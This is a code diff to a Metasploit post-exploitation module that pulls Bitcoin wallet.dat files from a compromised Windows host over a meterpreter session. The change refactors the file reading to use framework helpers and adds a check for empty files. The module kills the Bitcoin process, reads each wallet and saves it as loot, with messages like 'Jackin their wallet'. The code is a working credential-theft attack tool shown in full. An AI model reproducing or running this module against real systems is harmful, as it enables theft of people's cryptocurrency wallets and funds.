@@ -9,22 +9,25 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/user_profiles'
 require 'msf/core/auxiliary/report'
+require 'msf/core/post/file'
 
 class Metasploit3 < Msf::Post
+
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
+	include Msf::Post::File
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Gather Bitcoin wallet.dat',
-				'Description'   => %q{
-					This module downloads any Bitcoin wallet.dat files from the target system
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => [ 'illwill <illwill[at]illmob.org>'],
-				'Platform'      => [ 'win' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'Name'          => 'Windows Gather Bitcoin wallet.dat',
+			'Description'   => %q{
+				This module downloads any Bitcoin wallet.dat files from the target system
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => [ 'illwill <illwill[at]illmob.org>'],
+			'Platform'      => [ 'win' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def run
@@ -38,8 +41,7 @@ class Metasploit3 < Msf::Post
 
 	def jack_wallet(filename)
 		data     = ""
-		found    = session.fs.file.stat(filename) rescue nil
-		return if not found
+		return if not file?(filename)
 
 		print_status("Wallet Found At #{filename}")
 		print_status("     Jackin their wallet...")
@@ -47,17 +49,24 @@ class Metasploit3 < Msf::Post
 		kill_bitcoin
 
 		begin
-			wallet = session.fs.file.new(filename, "rb")
-			until wallet.eof?
-				data << wallet.read
-			end
-
-			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
-			print_status("     Wallet Jacked.")
-		rescue ::Interrupt
-			raise $!
+			data = read_file(filename) || ''
 		rescue ::Exception => e
 			print_error("Failed to download #{filename}: #{e.class} #{e}")
+			return
+		end
+
+		if data.empty?
+			print_error("     No data found")
+		else
+			p = store_loot(
+				"bitcoin.wallet",
+				"application/octet-stream",
+				session,
+				data,
+				filename,
+				"Bitcoin Wallet"
+			)
+			print_status("     Wallet Jacked: #{p.to_s}")
 		end
 	end
 
